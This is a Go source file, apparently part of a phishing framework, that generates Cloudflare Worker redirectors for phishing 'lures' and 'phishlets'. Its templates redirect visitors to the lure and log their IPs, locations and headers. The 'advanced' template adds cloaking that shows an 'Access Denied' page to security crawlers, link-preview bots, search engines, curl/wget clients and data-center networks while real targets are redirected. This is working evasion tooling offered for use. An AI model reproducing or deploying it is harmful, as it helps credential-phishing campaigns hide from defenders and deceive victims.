package core

import (
	"encoding/json"
	"fmt"
	"strings"
	"text/template"
)

type WorkerType string

const (
	WorkerTypeSimpleRedirect WorkerType = "simple_redirect"
	WorkerTypeHtmlRedirector WorkerType = "html_redirector"
	WorkerTypeAdvanced       WorkerType = "advanced"
)

type CloudflareWorkerConfig struct {
	Type            WorkerType        `json:"type"`
	RedirectUrl     string            `json:"redirect_url"`
	UserAgentFilter string            `json:"ua_filter,omitempty"`
	GeoFilter       []string          `json:"geo_filter,omitempty"`
	DelaySeconds    int               `json:"delay_seconds,omitempty"`
	CustomHtml      string            `json:"custom_html,omitempty"`
	Headers         map[string]string `json:"headers,omitempty"`
	LogRequests     bool              `json:"log_requests"`
}

type CloudflareWorkerGenerator struct {
	cfg *Config
}

func NewCloudflareWorkerGenerator(cfg *Config) *CloudflareWorkerGenerator {
	return &CloudflareWorkerGenerator{
		cfg: cfg,
	}
}

const workerTemplateSimpleRedirect = `
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const redirectUrl = '{{.RedirectUrl}}'
  {{if .UserAgentFilter}}
  const userAgent = request.headers.get('User-Agent') || ''
  const uaRegex = new RegExp('{{.UserAgentFilter}}', 'i')
  
  if (!uaRegex.test(userAgent)) {
    return new Response('Access Denied', { status: 403 })
  }
  {{end}}
  
  {{if .GeoFilter}}
  const country = request.cf?.country || 'XX'
  const allowedCountries = {{.GeoFilterJson}}
  
  if (!allowedCountries.includes(country)) {
    return new Response('Access Denied', { status: 403 })
  }
  {{end}}
  
  {{if .LogRequests}}
  // Log request details
  const logData = {
    timestamp: new Date().toISOString(),
    ip: request.headers.get('CF-Connecting-IP'),
    userAgent: request.headers.get('User-Agent'),
    country: request.cf?.country,
    url: request.url
  }
  console.log(JSON.stringify(logData))
  {{end}}
  
  {{if gt .DelaySeconds 0}}
  // Add delay before redirect
  await new Promise(resolve => setTimeout(resolve, {{.DelaySeconds}} * 1000))
  {{end}}
  
  return Response.redirect(redirectUrl, 302)
}
`

const workerTemplateHtmlRedirector = `
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const redirectUrl = '{{.RedirectUrl}}'
  {{if .UserAgentFilter}}
  const userAgent = request.headers.get('User-Agent') || ''
  const uaRegex = new RegExp('{{.UserAgentFilter}}', 'i')
  
  if (!uaRegex.test(userAgent)) {
    return new Response('Access Denied', { status: 403 })
  }
  {{end}}
  
  {{if .GeoFilter}}
  const country = request.cf?.country || 'XX'
  const allowedCountries = {{.GeoFilterJson}}
  
  if (!allowedCountries.includes(country)) {
    return new Response('Access Denied', { status: 403 })
  }
  {{end}}
  
  {{if .LogRequests}}
  // Log request details
  const logData = {
    timestamp: new Date().toISOString(),
    ip: request.headers.get('CF-Connecting-IP'),
    userAgent: request.headers.get('User-Agent'),
    country: request.cf?.country,
    url: request.url
  }
  console.log(JSON.stringify(logData))
  {{end}}
  
  const html = ` + "`" + `{{if .CustomHtml}}{{.CustomHtml}}{{else}}<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta http-equiv="refresh" content="{{if .DelaySeconds}}{{.DelaySeconds}}{{else}}2{{end}}; url={{.RedirectUrl}}">
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f0f0f0;
    }
    .loader {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #3498db;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .message {
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="message">
    <div class="loader"></div>
    <p>Please wait...</p>
  </div>
</body>
</html>{{end}}` + "`" + `
  
  return new Response(html, {
    headers: {
      'content-type': 'text/html;charset=UTF-8',
      {{range $key, $value := .Headers}}'{{$key}}': '{{$value}}',
      {{end}}
    },
  })
}
`

const workerTemplateAdvanced = `
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

// Configuration
const config = {
  redirectUrl: '{{.RedirectUrl}}',
  {{if .UserAgentFilter}}uaFilter: new RegExp('{{.UserAgentFilter}}', 'i'),{{end}}
  {{if .GeoFilter}}allowedCountries: {{.GeoFilterJson}},{{end}}
  logRequests: {{.LogRequests}},
  delaySeconds: {{.DelaySeconds}},
  // Anti-bot measures
  requireHeaders: ['Accept-Language', 'Accept-Encoding'],
  blockDataCenters: true,
  blockKnownBots: true
}

// Known bot user agents
const botPatterns = [
  /bot|crawler|spider|scraper|curl|wget|python|java|ruby/i,
  /facebookexternalhit|Twitterbot|LinkedInBot|WhatsApp|TelegramBot/i,
  /Google|Bing|Baidu|Yandex|DuckDuckBot/i
]

async function handleRequest(request) {
  const url = new URL(request.url)
  const cf = request.cf || {}
  
  // Log request if enabled
  if (config.logRequests) {
    await logRequest(request, cf)
  }
  
  // Check user agent filter
  {{if .UserAgentFilter}}
  const userAgent = request.headers.get('User-Agent') || ''
  if (!config.uaFilter.test(userAgent)) {
    return blockAccess('UA')
  }
  {{end}}
  
  // Check geo filter
  {{if .GeoFilter}}
  if (!config.allowedCountries.includes(cf.country || 'XX')) {
    return blockAccess('GEO')
  }
  {{end}}
  
  // Anti-bot checks
  if (config.blockKnownBots) {
    const ua = request.headers.get('User-Agent') || ''
    for (const pattern of botPatterns) {
      if (pattern.test(ua)) {
        return blockAccess('BOT')
      }
    }
  }
  
  // Check required headers
  for (const header of config.requireHeaders) {
    if (!request.headers.get(header)) {
      return blockAccess('HEADERS')
    }
  }
  
  // Block data centers
  if (config.blockDataCenters && cf.asOrganization) {
    const dcKeywords = ['hosting', 'cloud', 'vps', 'server', 'data center', 'datacenter']
    const org = cf.asOrganization.toLowerCase()
    if (dcKeywords.some(keyword => org.includes(keyword))) {
      return blockAccess('DC')
    }
  }
  
  // Add fingerprinting parameters
  const params = new URLSearchParams()
  params.set('cf_ip', request.headers.get('CF-Connecting-IP') || '')
  params.set('cf_country', cf.country || '')
  params.set('cf_ts', Date.now().toString())
  
  const finalUrl = config.redirectUrl + (config.redirectUrl.includes('?') ? '&' : '?') + params.toString()
  
  // Delay if configured
  if (config.delaySeconds > 0) {
    await new Promise(resolve => setTimeout(resolve, config.delaySeconds * 1000))
  }
  
  return Response.redirect(finalUrl, 302)
}

async function logRequest(request, cf) {
  const logEntry = {
    timestamp: new Date().toISOString(),
    ip: request.headers.get('CF-Connecting-IP'),
    userAgent: request.headers.get('User-Agent'),
    referer: request.headers.get('Referer'),
    country: cf.country,
    city: cf.city,
    asn: cf.asn,
    org: cf.asOrganization,
    url: request.url,
    headers: Object.fromEntries([...request.headers])
  }
  
  // In production, you might want to send this to a logging service
  console.log(JSON.stringify(logEntry))
}

function blockAccess(reason) {
  // Return a generic error page
  const html = ` + "`" + `<!DOCTYPE html>
<html>
<head>
  <title>Error</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      background-color: #f5f5f5;
    }
    h1 { color: #333; }
    p { color: #666; }
  </style>
</head>
<body>
  <h1>Access Denied</h1>
  <p>The requested resource is not available.</p>
  <!-- Debug: {{.reason}} -->
</body>
</html>` + "`" + `.replace('{{.reason}}', reason)
  
  return new Response(html, {
    status: 403,
    headers: { 'content-type': 'text/html;charset=UTF-8' }
  })
}
`

func (g *CloudflareWorkerGenerator) GenerateWorker(config CloudflareWorkerConfig) (string, error) {
	var tmplString string
	
	switch config.Type {
	case WorkerTypeSimpleRedirect:
		tmplString = workerTemplateSimpleRedirect
	case WorkerTypeHtmlRedirector:
		tmplString = workerTemplateHtmlRedirector
	case WorkerTypeAdvanced:
		tmplString = workerTemplateAdvanced
	default:
		return "", fmt.Errorf("unknown worker type: %s", config.Type)
	}
	
	data := struct {
		CloudflareWorkerConfig
		GeoFilterJson string
	}{
		CloudflareWorkerConfig: config,
	}
	
	if len(config.GeoFilter) > 0 {
		geoJson, err := json.Marshal(config.GeoFilter)
		if err != nil {
			return "", err
		}
		data.GeoFilterJson = string(geoJson)
	} else {
		data.GeoFilterJson = "[]"
	}
	
	tmpl, err := template.New("worker").Parse(tmplString)
	if err != nil {
		return "", fmt.Errorf("template parse error: %v", err)
	}
	
	var result strings.Builder
	if err := tmpl.Execute(&result, data); err != nil {
		return "", fmt.Errorf("template execute error: %v", err)
	}
	
	return result.String(), nil
}

func (g *CloudflareWorkerGenerator) GenerateWorkerFromLure(lure *Lure, workerType WorkerType) (string, error) {
	if lure == nil {
		return "", fmt.Errorf("lure cannot be nil")
	}
	
	phishletConfig := g.cfg.PhishletConfig(lure.Phishlet)
	if phishletConfig.Hostname == "" {
		return "", fmt.Errorf("phishlet '%s' has no hostname configured", lure.Phishlet)
	}
	
	redirectUrl := fmt.Sprintf("https://%s%s", lure.Hostname, lure.Path)
	if lure.RedirectUrl != "" {
		redirectUrl = lure.RedirectUrl
	}
	
	config := CloudflareWorkerConfig{
		Type:            workerType,
		RedirectUrl:     redirectUrl,
		UserAgentFilter: lure.UserAgentFilter,
		LogRequests:     true,
		DelaySeconds:    2,
	}
	
	if workerType == WorkerTypeHtmlRedirector && lure.Redirector != "" {
	}
	
	return g.GenerateWorker(config)
}
